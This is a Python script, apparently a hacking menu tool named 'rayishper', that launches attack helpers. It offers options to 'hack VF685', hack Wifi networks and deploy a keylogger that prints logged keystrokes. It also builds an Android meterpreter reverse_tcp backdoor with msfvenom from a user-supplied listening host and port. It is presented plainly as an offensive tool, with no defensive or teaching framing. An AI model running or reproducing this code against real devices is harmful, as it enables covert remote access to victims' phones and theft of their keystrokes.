import sys,os 
import subprocess


while(True):
    print("[1] hack VF685")
    print("[2] View Commant list")
    print("[3] Deploy a keylogger")
    print("[4] Create a payload")
    print("[5] Hack available Wifi networks")
    print("\n")
    choice = input("rayishper > ")

    if(choice == "1"):
        os.system('python3 VF685.py')
        break
    if(choice == "exit()"):
        break
    if(choice == "2"):
        os.system('cat "wordlist commands"')

    if(choice == "3"):
        print("+---------------------------------------+")
        print("| Keylogger is running | ctrl+c to stop |")
        print("+---------------------------------------+")
        os.system('python3 keylog.py')
        print("______________(Logged keys)______________")
        os.system('cat log.txt')

    if(choice == "4"):
        lport = input("Listening port -> ")
        lhost = input("Listening host -> ")
        location = input("Absolute location -> ")
        Backdoor_name = input("Backdoor name -> ")
        os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+ lhost + ' LPORT='+ lport + ' R> '+ location + ''+ Backdoor_name +'')

    # rayshper MAN
    if(choice == "--help" or choice == "man"):
        os.system("cat man.txt")

    # clearing the terminal 
    if(choice == "cl"):
        os.system("clear")    

    # list available files 
    if(choice == "ls"):
        os.system("ls")   

    # list files with permitions and hiddin files
    if(choice == "ls -la"):
        os.system("ls -la")

     # Displays the Current version
    if(choice == "cv"):
        print("+-------+")
        print("| v 1.0 |")
        print("+-------+")